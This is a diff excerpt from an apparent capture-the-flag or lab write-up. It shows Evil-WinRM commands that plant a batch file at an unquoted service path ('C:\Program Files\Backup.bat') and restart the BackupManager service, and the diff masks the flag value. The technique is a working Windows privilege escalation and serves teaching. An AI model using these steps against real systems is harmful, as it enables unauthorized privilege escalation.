@@ -942,7 +942,7 @@ SERVICE_NAME: BackupManager
 
 # Create exploit
 *Evil-WinRM* PS C:\> New-Item -ItemType File -Path "C:\Program Files\Backup.bat" -Force
-*Evil-WinRM* PS C:\> Set-Content "C:\Program Files\Backup.bat" 'echo FLAG{CLEFABLE09888919} > C:\ws_unquoted2.txt'
+*Evil-WinRM* PS C:\> Set-Content "C:\Program Files\Backup.bat" 'echo FLAG{C*************9} > C:\ws_unquoted2.txt'
 
 # Restart service
 *Evil-WinRM* PS C:\> Restart-Service BackupManager -Force
